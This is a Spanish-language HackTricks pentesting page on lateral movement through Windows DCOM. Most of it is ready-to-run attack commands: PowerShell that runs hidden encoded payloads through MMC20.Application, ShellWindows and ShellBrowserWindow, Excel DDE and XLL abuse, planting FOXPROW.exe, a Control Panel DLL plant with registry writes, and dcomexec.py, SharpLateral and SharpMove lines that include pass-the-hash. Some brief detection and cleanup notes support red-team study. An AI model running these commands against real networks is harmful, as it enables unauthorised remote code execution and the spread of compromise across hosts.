# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

El movimiento lateral mediante DCOM resulta atractivo porque reutiliza servidores COM existentes expuestos a través de RPC/DCOM, en lugar de crear un servicio o una tarea programada. En la práctica, esto significa que la conexión inicial suele comenzar en TCP/135 y luego pasa a puertos RPC altos asignados dinámicamente.

## Requisitos previos y consideraciones

- Normalmente necesitas un contexto de administrador local en el objetivo, y el servidor COM remoto debe permitir el inicio o la activación remotos.
- Desde el **14 de marzo de 2023**, Microsoft aplica el hardening de DCOM en los sistemas compatibles. Los clientes antiguos que solicitan un nivel de autenticación de activación bajo pueden fallar, a menos que negocien al menos `RPC_C_AUTHN_LEVEL_PKT_INTEGRITY`. Por lo general, los clientes modernos de Windows elevan automáticamente este nivel, por lo que las herramientas actuales suelen seguir funcionando.<sup>[[3]](#references)</sup>
- La ejecución manual o mediante scripts de DCOM suele requerir TCP/135 y el rango de puertos RPC dinámicos del objetivo. Si usas `dcomexec.py` de Impacket y quieres recibir la salida de los comandos, normalmente también necesitas acceso SMB a `ADMIN$` (o a otro recurso compartido con permisos de lectura y escritura).
- Si RPC/DCOM funciona, pero SMB está bloqueado, `dcomexec.py -nooutput` puede seguir siendo útil para la ejecución a ciegas.

Comprobaciones rápidas:

```bash
# Enumerate registered DCOM applications
Get-CimInstance Win32_DCOMApplication | Select-Object AppID, Name

# Useful to inspect firewall/RPC issues
Test-NetConnection -ComputerName 10.10.10.10 -Port 135
```

## MMC20.Application

Para obtener más información sobre esta técnica, consulta la [publicación original sobre MMC20.Application](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/).<sup>[[1]](#references)</sup>

Los objetos Distributed Component Object Model (DCOM) ofrecen una interesante capacidad para interactuar con objetos a través de la red. Microsoft proporciona documentación completa tanto para DCOM como para Component Object Model (COM), disponible [aquí para DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx) y [aquí para COM](<https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363(v=vs.85).aspx>). Se puede obtener una lista de aplicaciones DCOM con el comando de PowerShell:

```bash
Get-CimInstance Win32_DCOMApplication
```

El objeto COM, [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), permite crear scripts para las operaciones de los complementos de MMC. En particular, este objeto contiene un método `ExecuteShellCommand` en `Document.ActiveView`. Puedes encontrar más información sobre este método [aquí](<https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx>). Comprueba que se está ejecutando:<sup>[[6]](#references)</sup>

Esta función permite ejecutar comandos a través de una red mediante una aplicación DCOM. Para interactuar remotamente con DCOM como administrador, se puede usar PowerShell de la siguiente manera:

```bash
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```

Este comando se conecta a la aplicación DCOM y devuelve una instancia del objeto COM. A continuación, se puede invocar el método ExecuteShellCommand para ejecutar un proceso en el host remoto. El proceso consta de los siguientes pasos:

Verificar métodos:

```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```

Obtener RCE:

```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView.ExecuteShellCommand(
    "cmd.exe",
    $null,
    "/c powershell -NoP -W Hidden -Enc <B64>",
    "7"
)
```

El último argumento es el estilo de ventana. `7` mantiene la ventana minimizada. En la práctica, la ejecución basada en MMC suele hacer que un proceso remoto `mmc.exe` genere tu payload, lo que difiere de los objetos respaldados por Explorer que se describen a continuación.

## ShellWindows & ShellBrowserWindow

**Para obtener más información sobre esta técnica, consulta la publicación original [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**<sup>[[2]](#references)</sup>

Se observó que el objeto **MMC20.Application** no tenía un valor `LaunchPermission` específico de la aplicación.<sup>[[2]](#references)</sup> Esto no otorga acceso por sí solo: COM comprueba la ACL `DefaultLaunchPermission` de la máquina y las restricciones de inicio y acceso aplicables a toda la máquina.<sup>[[9]](#references)[[10]](#references)</sup> Para obtener más detalles, puedes consultar [este hilo](https://twitter.com/tiraniddo/status/817532039771525120); también se recomienda usar OleView .NET de [@tiraniddo](https://twitter.com/tiraniddo) para filtrar objetos sin un permiso de inicio explícito.

Se destacaron dos objetos específicos, `ShellBrowserWindow` y `ShellWindows`, porque no tienen permisos de inicio explícitos.<sup>[[2]](#references)</sup> La ausencia de un valor `LaunchPermission` en `HKCR:\AppID\{guid}` significa que no hay una ACL de inicio específica de la aplicación; **no** significa que la activación remota no tenga restricciones.<sup>[[9]](#references)[[10]](#references)</sup>

En comparación con `MMC20.Application`, estos objetos suelen ser más discretos desde el punto de vista de OPSEC, porque el comando suele terminar como proceso secundario de `explorer.exe` en el host remoto, en lugar de `mmc.exe`.

### ShellWindows

En el caso de `ShellWindows`, que no tiene un ProgID, los métodos de .NET `Type.GetTypeFromCLSID` y `Activator.CreateInstance` permiten instanciar el objeto mediante su CLSID. Este proceso utiliza OleView .NET para obtener el CLSID de `ShellWindows`. Una vez instanciado, es posible interactuar con el objeto mediante el método `WindowsShell.Item`, lo que permite invocar métodos como `Document.Application.ShellExecute`.<sup>[[2]](#references)</sup>

Se proporcionaron comandos de PowerShell de ejemplo para instanciar el objeto y ejecutar comandos de forma remota:

```bash
# Example
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```

### ShellBrowserWindow

`ShellBrowserWindow` es similar, pero puedes instanciarlo directamente mediante su CLSID y pivotar a `Document.Application.ShellExecute`:

```bash
$com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "10.10.10.10")
$obj = [System.Activator]::CreateInstance($com)
$obj.Document.Application.ShellExecute(
    "cmd.exe",
    "/c whoami > C:\\Windows\\Temp\\dcom.txt",
    "C:\\Windows\\System32",
    $null,
    0
)
```

### Movimiento lateral con objetos DCOM de Excel

El movimiento lateral se puede lograr explotando objetos DCOM de Excel. Para obtener información detallada, se recomienda leer la discusión sobre cómo aprovechar Excel DDE para el movimiento lateral mediante DCOM en [el blog de Cybereason](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom).<sup>[[5]](#references)</sup>

El proyecto Empire proporciona un script de PowerShell que demuestra el uso de Excel para la ejecución remota de código (RCE) mediante la manipulación de objetos DCOM. A continuación se muestran fragmentos del script disponible en [el repositorio de GitHub de Empire](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1), que muestran diferentes métodos para abusar de Excel y lograr RCE:

```bash
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
    $Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
    $Obj = [System.Activator]::CreateInstance($Com)
    $isx64 = [boolean]$obj.Application.ProductCode[21]
    Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
    $Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
    $Obj = [System.Activator]::CreateInstance($Com)
    $obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
    $Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
    $Obj = [System.Activator]::CreateInstance($Com)
    $Obj.DisplayAlerts = $false
    $Obj.DDEInitiate("cmd", "/c $Command")
}
```

Investigaciones recientes ampliaron esta área con el método `ActivateMicrosoftApp()` de `Excel.Application`. La idea clave es que Excel puede intentar iniciar aplicaciones heredadas de Microsoft, como FoxPro, Schedule Plus o Project, buscándolas en el `PATH` del sistema. Si un operador puede colocar un payload con uno de esos nombres esperados en una ubicación con permisos de escritura que forme parte del `PATH` del objetivo, Excel lo ejecutará.<sup>[[4]](#references)</sup>

Requisitos para esta variante:

- Admin local en el objetivo
- Excel instalado en el objetivo
- Capacidad para escribir un payload en un directorio con permisos de escritura dentro del `PATH` del objetivo

Ejemplo práctico que abusa de la búsqueda de FoxPro (`FOXPROW.exe`):

```bash
copy C:\Windows\System32\calc.exe \\192.168.52.100\c$\Users\victim\AppData\Local\Microsoft\WindowsApps\FOXPROW.exe
$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "192.168.52.100"))
$com.ActivateMicrosoftApp("5")
```

Si el host atacante no tiene registrado el ProgID local `Excel.Application`, instancia el objeto remoto mediante CLSID en su lugar:

```bash
$com = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("00020812-0000-0000-C000-000000000046", "192.168.52.100"))
$com.Application.ActivateMicrosoftApp("5")
```

Valores que se han visto abusados en la práctica:

- `5` -> `FOXPROW.exe`
- `6` -> `WINPROJ.exe`
- `7` -> `SCHDPLUS.exe`

### COpenControlPanel — carga de una DLL registrada del Panel de control

La clase `COpenControlPanel` (CLSID `{06622D85-6856-4460-8DE1-A81921B41C4B}`) expone `IOpenControlPanel` (IID `{D11AD862-66DE-4DF4-BF6C-1F5621996AF1}`). Su método `Open()` hace que un `dllhost.exe` remoto cargue las DLL del Panel de control registradas en la clave `Control Panel\Cpls`. La clase no tiene permisos explícitos de lanzamiento/acceso en los sistemas probados, por lo que hereda la política DCOM predeterminada (que normalmente requiere una cuenta de administrador para la activación remota). Basta con un nombre de elemento aleatorio para que `Open()` procese las DLL registradas; la carga útil no necesita una extensión `.cpl`, aunque debe ser una DLL válida de la arquitectura correcta.<sup>[[7]](#references)</sup>

Esta primitiva es **stage-and-trigger**, no una ejecución que solo requiere un comando: primero copia una DLL al destino y crea un valor `REG_EXPAND_SZ` que apunte a ella; luego activa el objeto mediante DCOM. Por ejemplo, desde un contexto administrativo de Windows:<sup>[[7]](#references)</sup>

```cmd
copy payload.dll \\target\C$\Windows\Temp\panel.dll
reg.exe add "\\target\HKLM\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls" /v Updater /t REG_EXPAND_SZ /d "C:\Windows\Temp\panel.dll" /f
```

El cliente público [CPLDCOMTrigger](https://github.com/klsecservices/CPLDCOMTrigger) implementa la llamada DCOM no documentada con Impacket. Basta con proporcionar un nombre arbitrario de elemento del Panel de control; el cliente puede informar de un error RPC aunque `dllhost.exe` haya cargado la DLL.<sup>[[8]](#references)</sup>

```bash
git clone https://github.com/klsecservices/CPLDCOMTrigger
cd CPLDCOMTrigger
python3 CPLTrig.py 'DOMAIN/user:password@target' -cpl random

# Pass-the-hash and Kerberos are also implemented
python3 CPLTrig.py 'DOMAIN/user@target' -hashes ':NTHASH' -cpl random
python3 CPLTrig.py 'DOMAIN/user@target.domain.local' -aesKey AES_KEY_HEX -dc-ip 10.10.10.10 -cpl random
```

Operativamente, esta vía también requiere un canal de escritura de archivos y acceso remoto al registro, por lo que genera más ruido que `MMC20`/`ShellWindows`. Crea un efecto secundario de persistencia, ya que al abrir el Panel de control más adelante se puede volver a cargar la misma entrada. Elimina el valor después de la ejecución y busca valores inesperados en `Control Panel\Cpls`, junto con cargas inusuales de DLL en `dllhost.exe`.<sup>[[7]](#references)</sup>

```cmd
reg.exe delete "\\target\HKLM\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls" /v Updater /f
del \\target\C$\Windows\Temp\panel.dll
```

### Herramientas de automatización para Lateral Movement

Se destacan dos herramientas para automatizar estas técnicas:

- **Invoke-DCOM.ps1**: Un script de PowerShell proporcionado por el proyecto Empire que simplifica la invocación de diferentes métodos para ejecutar código en máquinas remotas. Este script está disponible en el repositorio de GitHub de Empire.

- **SharpLateral**: Una herramienta diseñada para ejecutar código de forma remota, que se puede usar con el comando:

```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```

- [SharpMove](https://github.com/0xthirteen/SharpMove):

```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```

## Herramientas automáticas

- El script de Powershell [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) permite invocar fácilmente todas las formas documentadas de ejecutar código en otras máquinas.
- Puedes usar `dcomexec.py` de Impacket para ejecutar comandos en sistemas remotos mediante DCOM. Las versiones actuales admiten `ShellWindows`, `ShellBrowserWindow` y `MMC20`, y usan `ShellWindows` de forma predeterminada.

```bash
dcomexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Pick the object explicitly
dcomexec.py -object MMC20 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Blind execution when SMB/output retrieval is not available
dcomexec.py -object ShellBrowserWindow -nooutput 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c calc.exe"
```

- También podrías usar [**SharpLateral**](https://github.com/mertdas/SharpLateral):

```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```

- También podrías usar [**SharpMove**](https://github.com/0xthirteen/SharpMove)

```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```





## References

- [1] [Movimiento lateral usando el objeto COM MMC20.Application](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
- [2] [Movimiento lateral mediante DCOM: ronda 2](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)
- [3] [KB5004442: administrar los cambios para la omisión de la característica de seguridad del servidor DCOM de Windows (CVE-2021-26414)](https://support.microsoft.com/en-us/topic/kb5004442-manage-changes-for-windows-dcom-server-security-feature-bypass-cve-2021-26414-f1400b52-c141-43d2-941e-37ed901c769c)
- [4] [Movimiento lateral: aprovechar el potencial de la aplicación Excel de DCOM](https://specterops.io/blog/2023/10/30/lateral-movement-abuse-the-power-of-dcom-excel-application/)
- [5] [Aprovechar Excel DDE para el movimiento lateral mediante DCOM](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom)
- [6] [technet.microsoft.com - Clase de aplicación MMC (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx)
- [7] [Usar objetos DCOM para la ejecución remota de comandos](https://securelist.com/lateral-movement-via-dcom-abusing-control-panel/118232/)
- [8] [CPLDCOMTrigger](https://github.com/klsecservices/CPLDCOMTrigger)
- [9] [DefaultLaunchPermission - Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/com/defaultlaunchpermission)
- [10] [MS-DCOM: Apéndice B, comportamiento del producto - Microsoft Learn](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/acc42954-4073-4f05-b850-efd562022077)
{{#include ../../banners/hacktricks-training.md}}
